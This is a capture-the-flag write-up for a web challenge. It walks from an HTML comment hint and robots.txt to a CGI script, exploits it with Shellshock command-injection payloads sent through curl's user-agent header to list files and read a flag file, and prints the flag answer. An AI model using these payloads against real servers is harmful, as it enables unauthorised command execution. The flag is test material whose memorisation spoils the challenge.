# web200

## Description
You’ll be shocked when you finally get it.

http://3.238.30.178:3022

## Solve
Inspecting the source has this comment:
```html
<!--How do we feel about robots? Think they'll take over the world some day?-->
```

A hint to `robots.txt`... Lets visit the path http://3.238.30.178:3022/robots.txt
```
User-agent: *
Disallow: /cgi-bin/status.cgi
```

Vistiting this path on the site runs a CGI script (Common Gateway Interface). Basically the web server runs a script and show the output in the browser. In this case it looks like the script is running `echo Robot C2 link up since: $(uptime)` or something similar. This is likely going to be a [Shellshock](https://www.infosecarticles.com/exploiting-shellshock-vulnerability/) vulnerability.

Now we can test if the server is vulnerable:
```bash
curl -A "() { :; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://44.197.231.105:3022/cgi-bin/status.cgi
```
This is making a request ot the server and setting our user agent to `() { :; }; echo  ; echo ; /usr/bin/id`. Let's break down what this means:

- `(){ :; };` Builds a function but since it has `:` it does nothing and just returns.
- After this we echo a blank line before our response body (this is needed when seperating request headers from the body)
- Then we are running `/usr/bin/id` which puts the output in the response body

I found out the server blocks making remote connections so no reverse shell. My next idea was to search for the flag's path and `cat` it out:
```bash
curl -A '() { :; }; echo ; /bin/bash -c "find / -name "flag.txt""' http://44.197.231.105:3022/cgi-bin/status.cgi
```
```
/var/www/flag.txt
```

And now for the flag:
```bash
curl -A '() { :; }; echo ; /bin/bash -c "cat /var/www/flag.txt"' http://44.197.231.105:3022/cgi-bin/status.cgi
```

## Flag
```
MCA{721af99eaabd12a59602e8ade39caab934bea333}
```